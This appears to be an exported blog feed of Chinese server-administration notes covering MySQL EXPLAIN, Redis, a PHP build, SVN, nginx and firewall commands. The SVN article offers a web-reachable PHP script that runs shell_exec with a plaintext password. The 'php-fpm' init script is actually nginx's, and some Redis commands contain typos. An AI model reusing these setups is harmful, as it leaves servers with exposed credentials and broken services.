unique_subquery：用于where中的in形式子查询，子查询返回不重复值唯一值 index_subquery：用于in形式子查询使用到了辅助索引或者in常数列表，子查询可能返回重复值，可以使用索引将子查询去重。 range：索引范围扫描，常见于使用&gt;,&lt;,is null,between ,in ,like等运算符的查询中。 index_merge：表示查询使用了两个以上的索引，最后取交集或者并集，常见and ，or的条件使用了不同的索引，官方排序这个在ref_or_null之后，但是实际上由于要读取所个索引，性能可能大部分时间都不如range index：索引全表扫描，把索引从头到尾扫一遍，常见于使用索引列就可以处理不需要读取数据文件的查询、可以使用索引排序或者分组的查询。 all：这个就是全表扫描数据文件，然后再在server层进行过滤返回符合要求的记录。 possible_keys查询可能使用到的索引都会在这里列出来 key查询真正使用到的索引，select_type为index_merge时，这里可能出现两个以上的索引，其他的select_type这里只会出现一个。 key_len用于处理查询的索引长度，如果是单列索引，那就整个索引长度算进去，如果是多列索引，那么查询不一定都能使用到所有的列，具体使用到了多少个列的索引，这里就会计算进去，没有使用到的列，这里不会计算进去。留意下这个列的值，算一下你的多列索引总长度就知道有没有使用到所有的列了。要注意，mysql的ICP特性使用到的索引不会计入其中。另外，key_len只计算where条件用到的索引长度，而排序和分组就算用到了索引，也不会计算到key_len中。 ref如果是使用的常数等值查询，这里会显示const，如果是连接查询，被驱动表的执行计划这里会显示驱动表的关联字段，如果是条件使用了表达式或者函数，或者条件列发生了内部隐式转换，这里可能显示为func rows这里是执行计划中估算的扫描行数，不是精确值 extra这个列可以显示的信息非常多，有几十种，常用的有 distinct：在select部分使用了distinc关键字 no tables used：不带from字句的查询或者From dual查询 使用not in()形式子查询或not exists运算符的连接查询，这种叫做反连接。即，一般连接查询是先查询内表，再查询外表，反连接就是先查询外表，再查询内表。 using filesort：排序时无法使用到索引时，就会出现这个。常见于order by和group by语句中 using index：查询时不需要回表查询，直接通过索引就可以获取查询的数据。 using join buffer（block nested loop），using join buffer（batched key accss）：5.6.x之后的版本优化关联查询的BNL，BKA特性。主要是减少内表的循环数量以及比较顺序地扫描查询。 using sort_union，using_union，using intersect，using sort_intersection： using intersect：表示使用and的各个索引的条件时，该信息表示是从处理结果获取交集 using union：表示使用or连接各个使用索引的条件时，该信息表示从处理结果获取并集 using sort_union和using sort_intersection：与前面两个对应的类似，只是他们是出现在用and和or查询信息量大时，先查询主键，然后进行排序合并后，才能读取记录并返回。 using temporary：表示使用了临时表存储中间结果。临时表可以是内存临时表和磁盘临时表，执行计划中看不出来，需要查看status变量，used_tmp_table，used_tmp_disk_table才能看出来。 using where：表示存储引擎返回的记录并不是所有的都满足查询条件，需要在server层进行过滤。查询条件中分为限制条件和检查条件，5.6之前，存储引擎只能根据限制条件扫描数据并返回，然后server层根据检查条件进行过滤再返回真正符合查询的数据。5.6.x之后支持ICP特性，可以把检查条件也下推到存储引擎层，不符合检查条件和限制条件的数据，直接不读取，这样就大大减少了存储引擎扫描的记录数量。extra列显示using index condition firstmatch(tb_name)：5.6.x开始引入的优化子查询的新特性之一，常见于where字句含有in()类型的子查询。如果内表的数据量比较大，就可能出现这个 loosescan(m..n)：5.6.x之后引入的优化子查询的新特性之一，在in()类型的子查询中，子查询返回的可能有重复记录时，就可能出现这个 除了这些之外，还有很多查询数据字典库，执行计划过程中就发现不可能存在结果的一些提示信息 filtered使用explain extended时会出现这个列，5.7之后的版本默认就有这个字段，不需要使用explain extended了。这个字段表示存储引擎返回的数据在server层过滤后，剩下多少满足查询的记录数量的比例，注意是百分比，不是具体记录数。]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Laravel SQLSTATE 2002-No such file or directory]]></title>
    <url>%2Farticles%2FLaravel%20SQLSTATE%202002%20-%20No%20such%20file%20or%20directory%2F</url>
    <content type="text"><![CDATA[问题 SQLSTATE[HY000] [2002] No such file or directory 原因 框架没有找到对应的mysql执行 解决方案 执行sql语句 show variables like ‘%sock%’ 获取 mysql socket 的位置 , 对应返回的字段 socket 对应的value, 一般的结果大概长这个样子 /tmp/mysql.sock 修改文件 ./config/database.php 中的 connections 下的 mysql 添加 ‘unix_socket’ =&gt; ‘/tmp/mysql.sock’ 或者在.env中添加 DB_SOCKET = /tmp/mysql.sock]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Redis 后台启动]]></title>
    <url>%2Farticles%2FRedis-%E5%90%8E%E5%8F%B0%E5%90%AF%E5%8A%A8%2F</url>
    <content type="text"><![CDATA[启动redis-server redis.conf (需要指定配置文件) 后台运行linux: redis.conf 添加 daemonize yes配置 window 安装redis服务: 1redis-server --service-install redis.conf 安装多个实例 1234567891011redis-server --service-install –service-name redisService1 –port 10001redis-server --service-start –service-name redisService1redis-server --service-install –service-name redisService2 –port 10002redis-server --service-start –service-name redisServicredis-server --service-install –service-name redisService3 –port 10003redis-server --service-start –service-name redisService3 启动redis 123redis-server --service-start 停止redisredis-server --service-stop 卸载redis服务 1redis-server --service-install redis.windows.conf]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Centos7 安装PHP]]></title>
    <url>%2Farticles%2FCentos7%20%20%20%E5%AE%89%E8%A3%85PHP%2F</url>
    <content type="text"><![CDATA[1、首先官网下载php wget http://cn2.php.net/distributions/php-7.1.27.tar.gz 下载后，解压到服务器/usr/src目录 : tar -zxvf php-7.1.27.tar.gz 2、 添加www用户 123# groupadd www# useradd -g www www 3、完了后，configure编译，如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667# ./configure \--prefix=/usr/local/php \--with-config-file-path=/usr/local/php/etc \--enable-inline-optimization \--disable-debug \--disable-rpath \--enable-shared \--enable-opcache \--enable-fpm \--with-fpm-user=www \--with-fpm-group=www \--with-mysql=mysqlnd \--with-mysqli=mysqlnd \--with-pdo-mysql=mysqlnd \--with-gettext \--enable-mbstring \--with-iconv \--with-mcrypt \--with-mhash \--with-openssl \--enable-bcmath \--enable-soap \--with-libxml-dir \--enable-pcntl \--enable-shmop \--enable-sysvmsg \--enable-sysvsem \--enable-sysvshm \--enable-sockets \--with-curl \--with-zlib \--enable-zip \--with-bz2 \--with-readline 不好粘贴就复制下面的： 1./configure --prefix=/usr/local/php --with-config-file-path=/usr/local/php/etc --enable-inline-optimization --disable-debug --disable-rpath --enable-shared --enable-opcache --enable-fpm --with-fpm-user=www --with-fpm-group=www --with-mysqli=mysqlnd --with-pdo-mysql=mysqlnd --with-gettext --enable-mbstring --with-iconv --with-mcrypt --with-mhash --with-openssl --enable-bcmath --enable-soap --with-libxml-dir --enable-pcntl --enable-shmop --enable-sysvmsg --enable-sysvsem --enable-sysvshm --enable-sockets --with-curl --with-zlib --enable-zip --with-bz2 --with-readline --with-gd --enable-gd-native-ttf --enable-gd-jis-conv 这个命令出现的错误直接百度就能解决。 4、安装 12345makemake testmake install 出现以下表示安装成功 1234567[root@xxx bin]# ./php -versionPHP 7.1.27 (cli) (built: Mar 11 2019 14:55:23) ( NTS )Copyright (c) 1997-2018 The PHP GroupZend Engine v3.1.0, Copyright (c) 1998-2018 Zend Technologies 5、 配置php-fpm 服务，自启动 1cp php.ini-development /usr/local/php/etc/php.ini 设置开机启动项的步骤和原理都是一样的，这里不再累赘太多，我直接上重点。 1vi /etc/init.d/php-fpm 然后加入下面的脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112#!/bin/sh## nginx - this script starts and stops the nginx daemon## chkconfig: - 85 15# description: NGINX is an HTTP(S) server, HTTP(S) reverse \# proxy and IMAP/POP3 proxy server# processname: nginx# config: /etc/nginx/nginx.conf# config: /etc/sysconfig/nginx# pidfile: /var/run/nginx.pid# Source function library.. /etc/rc.d/init.d/functions# Source networking configuration.. /etc/sysconfig/network# Check that networking is up.[ "$NETWORKING" = "no" ] &amp;&amp; exit 0nginx="/usr/sbin/nginx"prog=$(basename $nginx)NGINX_CONF_FILE="/etc/nginx/nginx.conf"[ -f /etc/sysconfig/nginx ] &amp;&amp; . /etc/sysconfig/nginxlockfile=/var/lock/subsys/nginxmake_dirs() &#123; # make required directories user=`$nginx -V 2&gt;&amp;1 | grep "configure arguments:" | sed 's/[^*]*--user=\([^ ]*\).*/\1/g' -` if [ -z "`grep $user /etc/passwd`" ]; then useradd -M -s /bin/nologin $user fi options=`$nginx -V 2&gt;&amp;1 | grep 'configure arguments:'` for opt in $options; do if [ `echo $opt | grep '.*-temp-path'` ]; then value=`echo $opt | cut -d "=" -f 2` if [ ! -d "$value" ]; then # echo "creating" $value mkdir -p $value &amp;&amp; chown -R $user $value fi fi done&#125;start() &#123; [ -x $nginx ] || exit 5 [ -f $NGINX_CONF_FILE ] || exit 6 make_dirs echo -n $"Starting $prog: " daemon $nginx -c $NGINX_CONF_FILE retval=$? echo [ $retval -eq 0 ] &amp;&amp; touch $lockfile return $retval&#125;stop() &#123; echo -n $"Stopping $prog: " killproc $prog -QUIT retval=$? echo [ $retval -eq 0 ] &amp;&amp; rm -f $lockfile return $retval&#125;restart() &#123; configtest || return $? stop sleep 1 start&#125;reload() &#123; configtest || return $? echo -n $"Reloading $prog: " killproc $nginx -HUP RETVAL=$? echo&#125;force_reload() &#123; restart&#125;configtest() &#123; $nginx -t -c $NGINX_CONF_FILE&#125;rh_status() &#123; status $prog&#125;rh_status_q() &#123; rh_status &gt;/dev/null 2&gt;&amp;1&#125;case "$1" in start) rh_status_q &amp;&amp; exit 0 $1 ;; stop) rh_status_q || exit 0 $1 ;; restart|configtest) $1 ;; reload) rh_status_q || exit 7 $1 ;; force-reload) force_reload ;; status) rh_status ;; condrestart|try-restart) rh_status_q || exit 0 ;; *) echo $"Usage: $0 &#123;start|stop|status|restart|condrestart|try-restart|reload|force-reload|configtest&#125;" exit 2esac 设置可执行权限 1chmod +x php-fpm 再就是加到开机启动项里面去 1chkconfig --add php-fpm 然后测试指令 123service php-fpm start #开启service php-fpm stop #停止]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu切换默认sh为bash或者dash]]></title>
    <url>%2Farticles%2FUbuntu%E5%88%87%E6%8D%A2%E9%BB%98%E8%AE%A4sh%E4%B8%BAbash%E6%88%96%E8%80%85dash%2F</url>
    <content type="text"><![CDATA[bash与dash从Ubuntu 6.10开始，默认使用dash(theDebian Almquist Shell)而不是bash(the GNUBourne-Again Shell). 但Login Shell还是bash. 原因是dash更快、更高效，而且它符合POSIX规范。Ubuntu在启动的时候会运行很多shell脚本，使用dash可以加快启动速度。 什么是bash ？Bash(GNU Bourne-Again Shell)是许多Linux平台的内定Shell，事实上，还有许多传统UNIX上用的Shell，像tcsh、csh、ash、bsh、ksh等等，Shell Script大致都类同，当您学会一种Shell以后，其它的Shell会很快就上手，大多数的时候，一个Shell Script通常可以在很多种Shell上使用 什么是dash ？dash is the standard command interpreter for the system. The current version of dash is in the process of being changed to conform with the POSIX 1003.2 and 1003.2a specifications for the shell. 切换bash和dash查看与使用先用命令ls -l /bin/sh看看 /bin/sh -&gt; dash 我们会发现Ubuntu默认采用的是 dash 切换sh为bash如果要修改默认的sh，可以采用命令 sudo dpkg-reconfigure dash 然后选择否 成功后再执行 ll /bin/sh 结果是： /bin/sh -&gt; bash 修改成功！ 切换sh为dash当然我们也可以使用 sudo dpkg-reconfigure dash 把sh修改回去]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Redis几个认识误区]]></title>
    <url>%2Farticles%2FRedis%E5%87%A0%E4%B8%AA%E8%AE%A4%E8%AF%86%E8%AF%AF%E5%8C%BA%2F</url>
    <content type="text"><![CDATA[最近研究了Redis。去年曾做过一个MemcacheDB, Tokyo Tyrant, Redis performance test，到目前为止，这个benchmark结果依然有效。这1年我们经历了很多眼花缭乱的key value存储产品的诱惑，从Cassandra的淡出(Twitter暂停在主业务使用)到HBase的兴起(Facebook新的邮箱业务选用HBase(2))，当再回头再去看Redis，发现这个只有1万多行源代码的程序充满了神奇及大量未经挖掘的特性。Redis性能惊人，国内前十大网站的子产品估计用1台Redis就可以满足存储及Cache的需求。除了性能印象之外，业界其实普遍对Redis的认识存在一定误区。本文提出一些观点供大家探讨。 1. Redis是什么这个问题的结果影响了我们怎么用Redis。如果你认为Redis是一个key value store, 那可能会用它来代替MySQL；如果认为它是一个可以持久化的cache, 可能只是它保存一些频繁访问的临时数据。Redis是REmote DIctionary Server的缩写，在Redis在官方网站的的副标题是A persistent key-value database with built-in net interface written in ANSI-C for Posix systems，这个定义偏向key value store。还有一些看法则认为Redis是一个memory database，因为它的高性能都是基于内存操作的基础。另外一些人则认为Redis是一个data structure server，因为Redis支持复杂的数据特性，比如List, Set等。对Redis的作用的不同解读决定了你对Redis的使用方式。 互联网数据目前基本使用两种方式来存储，关系数据库或者key value。但是这些互联网业务本身并不属于这两种数据类型，比如用户在社会化平台中的关系，它是一个list，如果要用关系数据库存储就需要转换成一种多行记录的形式，这种形式存在很多冗余数据，每一行需要存储一些重复信息。如果用key value存储则修改和删除比较麻烦，需要将全部数据读出再写入。Redis在内存中设计了各种数据类型，让业务能够高速原子的访问这些数据结构，并且不需要关心持久存储的问题，从架构上解决了前面两种存储需要走一些弯路的问题。 2. Redis不可能比Memcache快很多开发者都认为Redis不可能比Memcached快，Memcached完全基于内存，而Redis具有持久化保存特性，即使是异步的，Redis也不可能比Memcached快。但是测试结果基本是Redis占绝对优势。一直在思考这个原因，目前想到的原因有这几方面。Libevent,和Memcached不同，Redis并没有选择libevent。Libevent为了迎合通用性造成代码庞大(目前Redis代码还不到libevent的1/3)及牺牲了在特定平台的不少性能。Redis用libevent中两个文件修改实现了自己的epoll event loop(4)。业界不少开发者也建议Redis使用另外一个libevent高性能替代libev，但是作者还是坚持Redis应该小巧并去依赖的思路。一个印象深刻的细节是编译Redis之前并不需要执行./configure。CAS问题。CAS是Memcached中比较方便的一种防止竞争修改资源的方法。CAS实现需要为每个cache key设置一个隐藏的cas token，cas相当value版本号，每次set会token需要递增，因此带来CPU和内存的双重开销，虽然这些开销很小，但是到单机10G+ cache以及QPS上万之后这些开销就会给双方相对带来一些细微性能差别(5)。 3. 单台Redis的存放数据必须比物理内存小Redis的数据全部放在内存带来了高速的性能，但是也带来一些不合理之处。比如一个中型网站有100万注册用户，如果这些资料要用Redis来存储，内存的容量必须能够容纳这100万用户。但是业务实际情况是100万用户只有5万活跃用户，1周来访问过1次的也只有15万用户，因此全部100万用户的数据都放在内存有不合理之处，RAM需要为冷数据买单。 这跟操作系统非常相似，操作系统所有应用访问的数据都在内存，但是如果物理内存容纳不下新的数据，操作系统会智能将部分长期没有访问的数据交换到磁盘，为新的应用留出空间。现代操作系统给应用提供的并不是物理内存，而是虚拟内存(Virtual Memory)的概念。 基于相同的考虑，Redis 2.0也增加了VM特性。让Redis数据容量突破了物理内存的限制。并实现了数据冷热分离。 4. Redis的VM实现是重复造轮子Redis的VM依照之前的epoll实现思路依旧是自己实现。但是在前面操作系统的介绍提到OS也可以自动帮程序实现冷热数据分离，Redis只需要OS申请一块大内存，OS会自动将热数据放入物理内存，冷数据交换到硬盘，另外一个知名的“理解了现代操作系统(3)”的Varnish就是这样实现，也取得了非常成功的效果。 作者antirez在解释为什么要自己实现VM中提到几个原因(6)。主要OS的VM换入换出是基于Page概念，比如OS VM 1个Page是4K, 4K中只要还有一个元素即使只有1个字节被访问，这个页也不会被SWAP, 换入也同样道理，读到一个字节可能会换入4K无用的内存。而Redis自己实现则可以达到控制换入的粒度。另外访问操作系统SWAP内存区域时block进程，也是导致Redis要自己实现VM原因之一。 5. 用get/set方式使用Redis作为一个key value存在，很多开发者自然的使用set/get方式来使用Redis，实际上这并不是最优化的使用方法。尤其在未启用VM情况下，Redis全部数据需要放入内存，节约内存尤其重要。 假如一个key-value单元需要最小占用512字节，即使只存一个字节也占了512字节。这时候就有一个设计模式，可以把key复用，几个key-value放入一个key中，value再作为一个set存入，这样同样512字节就会存放10-100倍的容量。 这就是为了节约内存，建议使用hashset而不是set/get的方式来使用Redis，详细方法见参考文献(7)。 6. 使用aof代替snapshotRedis有两种存储方式，默认是snapshot方式，实现方法是定时将内存的快照(snapshot)持久化到硬盘，这种方法缺点是持久化之后如果出现crash则会丢失一段数据。因此在完美主义者的推动下作者增加了aof方式。aof即append only mode，在写入内存数据的同时将操作命令保存到日志文件，在一个并发更改上万的系统中，命令日志是一个非常庞大的数据，管理维护成本非常高，恢复重建时间会非常长，这样导致失去aof高可用性本意。另外更重要的是Redis是一个内存数据结构模型，所有的优势都是建立在对内存复杂数据结构高效的原子操作上，这样就看出aof是一个非常不协调的部分。 其实aof目的主要是数据可靠性及高可用性，在Redis中有另外一种方法来达到目的：Replication。由于Redis的高性能，复制基本没有延迟。这样达到了防止单点故障及实现了高可用。 小结要想成功使用一种产品，我们需要深入了解它的特性。Redis性能突出，如果能够熟练的驾驭，对国内很多大型应用具有很大帮助。希望更多同行加入到Redis使用及代码研究行列。 参考文献 On Designing and Deploying Internet-Scale Service Facebook’s New Real-Time Messaging System: HBase To Store 135+ Billion Messages A Month What’s wrong with 1975 programming Linux epoll is now supported (Google Groups) CAS and why I don’t want to add it to Redis (Google Groups) Plans for Virtual Memory (Google Groups) Full of keys (Salvatore antirez Sanfilippo)]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MySQL误区]]></title>
    <url>%2Farticles%2FMySQL%E8%AF%AF%E5%8C%BA%2F</url>
    <content type="text"><![CDATA[mysql子查询含有limit时报错： ERROR 1235 (42000): This version of MySQL doesn’t yet support ‘LIMIT &amp; IN/ALL/ANY/SOME subquery’ 这样的SQL无法执行 : 1select * from table where id in (select id from table limit 10); 解决方法 如： 1select * from table where id in (select t.id from (select * from table limit 10)as t)]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[图解正向代理、反向代理、透明代理]]></title>
    <url>%2Farticles%2F%E5%9B%BE%E8%A7%A3%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86%2F</url>
    <content type="text"><![CDATA[一、正向代理一般情况下，如果没有特别说明，代理技术默认说的是正向代理技术。关于正向代理的概念如下： 正向代理(forward)是一个位于客户端【用户A】和原始服务器(origin server)【服务器B】之间的服务器【代理服务器Z】，为了从原始服务器取得内容，用户A向代理服务器Z发送一个请求并指定目标(服务器B)，然后代理服务器Z向服务器B转交请求并将获得的内容返回给客户端。客户端必须要进行一些特别的设置才能使用正向代理。 从上面的概念中，我们看出，文中所谓的正向代理就是代理服务器替代访问方【用户A】去访问目标服务器【服务器B】 这就是正向代理的意义所在。而为什么要用代理服务器去代替访问方【用户A】去访问服务器B呢？这就要从代理服务器使用的意义说起。 使用正向代理服务器作用主要有以下几点： 1、访问本无法访问的服务器B，如下图1.2 我们抛除复杂的网络路由情节来看图1.2，假设图中路由器从左到右命名为R1,R2假设最初用户A要访问服务器B需要经过R1和R2路由器这样一个路由节点，如果路由器R1或者路由器R2发生故障，那么就无法访问服务器B了。但是如果用户A让代理服务器Z去代替自己访问服务器B，由于代理服务器Z没有在路由器R1或R2节点中，而是通过其它的路由节点访问服务器B，那么用户A就可以得到服务器B的数据了。现实中的例子就是“翻墙”。不过自从VPN技术被广泛应用外，“翻墙”不但使用了传统的正向代理技术，有的还使用了VPN技术。 2、加速访问服务器B 这种说法目前不像以前那么流行了，主要是带宽流量的飞速发展。早期的正向代理中，很多人使用正向代理就是提速。还是如图1.2 假设用户A到服务器B，经过R1路由器和R2路由器，而R1到R2路由器的链路是一个低带宽链路。而用户A到代理服务器Z，从代理服务器Z到服务器B都是高带宽链路。那么很显然就可以加速访问服务器B了。 3、Cache作用 Cache（缓存）技术和代理服务技术是紧密联系的（不光是正向代理，反向代理也使用了Cache（缓存）技术。还如上图所示，如果在用户A访问服务器B某数据J之前，已经有人通过代理服务器Z访问过服务器B上得数据J，那么代理服务器Z会把数据J保存一段时间，如果有人正好取该数据J，那么代理服务器Z不再访问服务器B，而把缓存的数据J直接发给用户A。这一技术在Cache中术语就叫Cache命中。如果有更多的像用户A的用户来访问代理服务器Z，那么这些用户都可以直接从代理服务器Z中取得数据J，而不用千里迢迢的去服务器B下载数据了。 4、客户端访问授权 这方面的内容现今使用的还是比较多的，例如一些公司采用ISA SERVER做为正向代理服务器来授权用户是否有权限访问互联网， 防火墙作为网关，用来过滤外网对其的访问。假设用户A和用户B都设置了代理服务器，用户A允许访问互联网，而用户B不允许访问互联网（这个在代理服务器Z上做限制）这样用户A因为授权，可以通过代理服务器访问到服务器B，而用户B因为没有被代理服务器Z授权，所以访问服务器B时，数据包会被直接丢弃。 5、隐藏访问者的行踪 我们可以看出服务器B并不知道访问自己的实际是用户A，因为代理服务器Z代替用户A去直接与服务器B进行交互。如果代理服务器Z被用户A完全控制（或不完全控制），会惯以“肉鸡”术语称呼。 我们总结一下 正向代理是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端必须设置正向代理服务器，当然前提是要知道正向代理服务器的IP地址，还有代理程序的端口。 二、反向代理反向代理正好与正向代理相反，对于客户端而言代理服务器就像是原始服务器，并且客户端不需要进行任何特别的设置。客户端向反向代理的命名空间(name-space)中的内容发送普通请求，接着反向代理将判断向何处(原始服务器)转交请求，并将获得的内容返回给客户端。 使用反向代理服务器的作用如下： 1、保护和隐藏原始资源服务器如下图2.1 用户A始终认为它访问的是原始服务器B而不是代理服务器Z，但实用际上反向代理服务器接受用户A的应答，从原始资源服务器B中取得用户A的需求资源，然后发送给用户A。由于防火墙的作用，只允许代理服务器Z访问原始资源服务器B。尽管在这个虚拟的环境下，防火墙和反向代理的共同作用保护了原始资源服务器B，但用户A并不知情。 2、负载均衡 当反向代理服务器不止一个的时候，我们甚至可以把它们做成集群，当更多的用户访问资源服务器B的时候，让不同的代理服务器Z（x）去应答不同的用户，然后发送不同用户需要的资源。 当然反向代理服务器像正向代理服务器一样拥有CACHE的作用，它可以缓存原始资源服务器B的资源，而不是每次都要向原始资源服务器B请求数据，特别是一些静态的数据，比如图片和文件，如果这些反向代理服务器能够做到和用户X来自同一个网络，那么用户X访问反向代理服务器X，就会得到很高质量的速度。这正是CDN技术的核心。 我们并不是讲解CDN，所以去掉了CDN最关键的核心技术智能DNS。只是展示CDN技术实际上利用的正是反向代理原理这块。 反向代理结论与正向代理正好相反，对于客户端而言它就像是原始服务器，并且客户端不需要进行任何特别的设置。客户端向反向代理的命名空间(name-space)中的内容发送普通请求，接着反向代理将判断向何处(原始服务器)转交请求，并将获得的内容返回给客户端，就像这些内容原本就是它自己的一样。 基本上，网上做正反向代理的程序很多，能做正向代理的软件大部分也可以做反向代理。开源软件中最流行的就是squid，既可以做正向代理，也有很多人用来做反向代理的前端服务器。另外MS ISA也可以用来在WINDOWS平台下做正向代理。反向代理中最主要的实践就是WEB服务，近些年来最火的就是Nginx了。网上有人说NGINX不能做正向代理，其实是不对的。NGINX也可以做正向代理，不过用的人比较少了。 三、透明代理如果把正向代理、反向代理和透明代理按照人类血缘关系来划分的话。那么正向代理和透明代理是很明显堂亲关系，而正向代理和反向代理就是表亲关系了 。 透明代理的意思是客户端根本不需要知道有代理服务器的存在，它改编你的request fields（报文），并会传送真实IP。注意，加密的透明代理则是属于匿名代理，意思是不用设置使用代理了。 透明代理实践的例子就是时下很多公司使用的行为管理软件。 用户A和用户B并不知道行为管理设备充当透明代理行为，当用户A或用户B向服务器A或服务器B提交请求的时候，透明代理设备根据自身策略拦截并修改用户A或B的报文，并作为实际的请求方，向服务器A或B发送请求，当接收信息回传，透明代理再根据自身的设置把允许的报文发回至用户A或B，如上图，如果透明代理设置不允许访问服务器B，那么用户A或者用户B就不会得到服务器B的数据。 正向代理代理的对象是客户端，反向代理代理的对象是服务端]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux安装svn及配置]]></title>
    <url>%2Farticles%2FLinux%E5%AE%89%E8%A3%85svn%E5%8F%8A%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[环境centos6.4 安装svn1yum -y install subversion 配置建立版本库目录 123mkdir /www/svndatasvnserve -d -r /www/svndata 建立版本库创建一个新的Subversion项目 1svnadmin create /var/www/svndata/njlrxx 配置允许用户jiqing访问 123cd /var/www/svndata/njlrxx/confvi svnserve.conf 12345anon-access=noneauth-access=writepassword-db=passwd 注：修改的文件前面不能有空格，否则启动svn server出错 1vi passwd 1234567[users]#&lt;用户1&gt; = &lt;密码1&gt;#&lt;用户2&gt; = &lt;密码2&gt;jiqing=123456 客户端连接12345svn co svn://ip/njlrxx用户名:jiqing密码：123456 实现SVN与WEB同步 设置WEB服务器根目录为/var/www/webroot checkout一份SVN svn co svn://localhost/njlrxx /var/www/webroot/njlrxx 修改权限为WEB用户 ( 否则无法远程up ) chown -R apache:apache /var/www/webroot/njlrxx 建立同步脚本 123cd /var/www/svndata/njlrxx/hooks/cp post-commit.tmpl post-commit 编辑post-commit,在文件最后添加以下内容 1234567891011REPOS=&quot;$1&quot;REV=&quot;$2&quot;BASEPATH=/var/www/webroot/njlrxxWEBPATH=&quot;$BASEPATH/&quot;export LANG=zh_CN.UTF-8svn update $WEBPATH --username jiqing --password 123456 --no-auth-cache 增加脚本执行权限 chmod +x post-commit 最后操作是关闭服务然再打开服务: svn服务的关闭： kill all svnserve svn开启： svnserve -d -r /var/www/svndata SVN自动同步程序执行流程： 1、用户提交文件到SVN服务器，提交操作成功后触发post-commit脚本 2、在post-commit版本文件中使用php_script.php执行PHP脚本 3、在PHP脚本中通过exec系统调用更新服务器上的版本库工作副本 4、根据更新操作结果日志，对另一个SVN版本库进行对应的操作处理 当然，你也可以手动同步到web：(以php为例) 创建 svn.php 到你的项目根目录（可以是php-fpm能解析的目录也可，只是需要更改下面对应的项目地址）,文件内容如下： 123456789&lt;?php$project = __DIR__; // 项目地址$str = "svn update &#123;$project&#125; --username 用户名 --password 密码 --no-auth-cache 2&gt;&amp;1";$res = @shell_exec($str);var_dump($res); 注意：需要将项目所属组改到 web服务器用户：chown -R nginx:nginx 项目/ , 否则会出现权限不够的情况 通过web访问 项目地址/svn.php 即可同步你的代码到web上面。]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
      <tags>
        <tag>svn安装</tag>
        <tag>svn配置</tag>
        <tag>svn同步</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux代理]]></title>
    <url>%2Farticles%2Flinux%E4%BB%A3%E7%90%86%2F</url>
    <content type="text"><![CDATA[nginx.conf 文件： 1234567891011121314151617181920server &#123; listen 80; server_name job.easysq.cn; location / &#123; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Nginx-Proxy true; proxy_set_header Connection ""; proxy_pass http://127.0.0.1:3003/; &#125;&#125;]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[linux端口检测]]></title>
    <url>%2Farticles%2Flinux%E7%AB%AF%E5%8F%A3%E6%A3%80%E6%B5%8B%2F</url>
    <content type="text"><![CDATA[永久开启端口firewall-cmd --add-port=3128/tcp --permanent 查询端口是否开启firewall-cmd --query-port=3128/tcp 启动firewallsystemctl start firewalld.service 停止firewallsystemctl stop firewalld.service]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[git、svn放弃本地更新]]></title>
    <url>%2Farticles%2Fgit-svn%E6%94%BE%E5%BC%83%E6%9C%AC%E5%9C%B0%E6%9B%B4%E6%96%B0%2F</url>
    <content type="text"><![CDATA[GIT1、只是下载远程的库的内容，不做任何的合并 git fetch --all 2、把HEAD指向刚刚下载的最新的版本 git reset --hard origin/master SVN第一种情况：改动没有被提交（commit）。 这种情况下，使用svn revert就能取消之前的修改。 svn revert用法如下： # svn revert [-R] something 其中something可以是（目录或文件的）相对路径也可以是绝对路径。 当something为单个文件时，直接svn revert something就行了；当something为目录时，需要加上参数-R(Recursive,递归)，否则只会将something这个目录的改动。 在这种情况下也可以使用svn update命令来取消对之前的修改，但不建议使用。因为svn update会去连接仓库服务器，耗费时间。 注意：svn revert本身有固有的危险，因为它的目的是放弃未提交的修改。一旦你选择了恢复，Subversion没有方法找回未提交的修改。 第二种情况：改动已经被提交（commit）。 这种情况下，用svn merge命令来进行回滚。 回滚的操作过程如下： 1、保证我们拿到的是最新代码： svn update 假设最新版本号是28。 2、然后找出要回滚的确切版本号： svn log [something] 假设根据svn log日志查出要回滚的版本号是25，此处的something可以是文件、目录或整个项目 如果想要更详细的了解情况，可以使用svn diff -r 28:25 [something] 3、回滚到版本号25： svn merge -r 28:25 something 为了保险起见，再次确认回滚的结果： svn diff [something] 发现正确无误，提交。 4、提交回滚： svn commit -m &quot;Revert revision from r28 to r25,because of ...&quot; 提交后版本变成了29。 将以上操作总结为三条如下： svn update，svn log，找到最新版本（latest revision） 找到自己想要回滚的版本号（rollbak revision） 用svn merge来回滚： svn merge -r : something]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[mysql数据定时备份]]></title>
    <url>%2Farticles%2Fmysql%E6%95%B0%E6%8D%AE%E5%AE%9A%E6%97%B6%E5%A4%87%E4%BB%BD%2F</url>
